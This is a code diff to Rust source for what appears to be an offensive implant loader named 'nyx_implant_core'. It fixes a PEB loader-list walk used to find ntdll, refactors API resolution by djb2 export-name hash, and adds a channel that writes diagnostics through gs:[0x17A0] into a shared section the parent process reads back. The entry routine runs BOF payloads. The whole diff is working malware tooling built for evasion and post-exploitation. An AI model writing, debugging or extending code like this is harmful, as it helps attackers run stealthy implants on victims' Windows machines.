@@ -176,7 +176,10 @@ unsafe fn ntdll_via_export_walk() -> Option<usize> {
                 return Some(dllbase);
             }
         }
-        flink = *(flink_p.add(0x8) as *const usize);
+        // Advance via InLoadOrderLinks.FLINK (offset 0x0). Reading +0x8
+        // follows BLINK — backwards — so the first entry's "next" is the
+        // list head and the walk ends after exactly one (exe) entry.
+        flink = *(flink_p as *const usize);
     }
     None
 }
@@ -255,6 +258,7 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
                         // base walks off the mapping and AVs the process
                         // (root cause of run 31308772386's 0xc0000005:
                         // RtlGetProcessHeap unresolvable -> scan undershot).
+                        unsafe { diag_u64(3, cand as u64) };
                         return nyx_implant_core::resolve::export_addr_by_hash_pub(cand, func_hash);
                     }
                 }
@@ -265,37 +269,48 @@ pub unsafe fn export_addr(module: &[u8], func: &[u8]) -> Option<usize> {
     };
     // 1) parent-provided base (same-boot ASLR; may differ per-process on 24H2)
     if base != 0 {
-        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+        let r = nyx_implant_core::resolve::export_addr_by_hash_pub(
             base as *mut u8,
             nyx_implant_core::resolve::djb2(func),
-        ) {
-            return Some(r);
-        }
-        if lower != func {
-            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
-                base as *mut u8,
-                nyx_implant_core::resolve::djb2(lower),
-            ) {
-                return Some(r);
+        )
+        .or_else(|| {
+            if lower != func {
+                nyx_implant_core::resolve::export_addr_by_hash_pub(
+                    base as *mut u8,
+                    nyx_implant_core::resolve::djb2(lower),
+                )
+            } else {
+                None
             }
+        });
+        if let Some(a) = r {
+            unsafe { diag_u64(0, base) };
+            unsafe { diag_u64(1, a as u64) };
+            return Some(a);
         }
     }
+    unsafe { diag_u64(0, base) };
     stamp_diag(0xD1); // parent-base miss (post-mortem milestone)
     // 2) loader-walk by export feature (name fields moved on 24H2)
-    if let Some(nt) = ntdll_via_export_walk() {
-        if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
+    let walk_nt = unsafe { ntdll_via_export_walk() };
+    unsafe { diag_u64(2, walk_nt.unwrap_or(0) as u64) };
+    if let Some(nt) = walk_nt {
+        let r = nyx_implant_core::resolve::export_addr_by_hash_pub(
             nt as *mut u8,
             nyx_implant_core::resolve::djb2(func),
-        ) {
-            return Some(r);
-        }
-        if lower != func {
-            if let Some(r) = nyx_implant_core::resolve::export_addr_by_hash_pub(
-                nt as *mut u8,
-                nyx_implant_core::resolve::djb2(lower),
-            ) {
-                return Some(r);
+        )
+        .or_else(|| {
+            if lower != func {
+                nyx_implant_core::resolve::export_addr_by_hash_pub(
+                    nt as *mut u8,
+                    nyx_implant_core::resolve::djb2(lower),
+                )
+            } else {
+                None
             }
+        });
+        if let Some(a) = r {
+            return Some(a);
         }
     }
     stamp_diag(0xD2); // export-probe walk miss
@@ -380,6 +395,23 @@ fn stamp_diag(v: u32) {
     }
 }
 
+/// Write one u64 into the diag record the entry stashed at gs:[0x17A0]
+/// (points at payload_trailer_end; the parent reads it back from its local
+/// section view — survives the child's death). Slots: [0] gs:[0x1780] as
+/// read, [1] parent-base lookup result, [2] export-walk ntdll base,
+/// [3] ret-scan image base.
+unsafe fn diag_u64(slot: usize, v: u64) {
+    let p: usize;
+    core::arch::asm!(
+        "mov {}, gs:[0x17A0]",
+        out(reg) p,
+        options(nostack, preserves_flags, readonly),
+    );
+    if p != 0 {
+        unsafe { ((p as *mut u64).add(slot)).write_unaligned(v) };
+    }
+}
+
 /// Parse the packed payload, stash the args pointer for the dataparse
 /// fallback, and run the BOF. Returns the ExitProcess code.
 unsafe fn entry_run(packed: *const u8) -> u32 {
@@ -448,6 +480,16 @@ unsafe fn entry_run(packed: *const u8) -> u32 {
                     options(nostack, preserves_flags),
                 );
             }
+        }
+        // Diag-record pointer for export_addr's per-fallback u64 slots
+        // (section slack space right after the 24-byte trailer; the probe
+        // reads it from its local view).
+        unsafe {
+            core::arch::asm!(
+                "mov qword ptr gs:[0x17A0], {}",
+                in(reg) packed.add(base_off + 24) as usize,
+                options(nostack, preserves_flags),
+            );
         }
     }
     // Stage 1: entry reached + payload parsed.
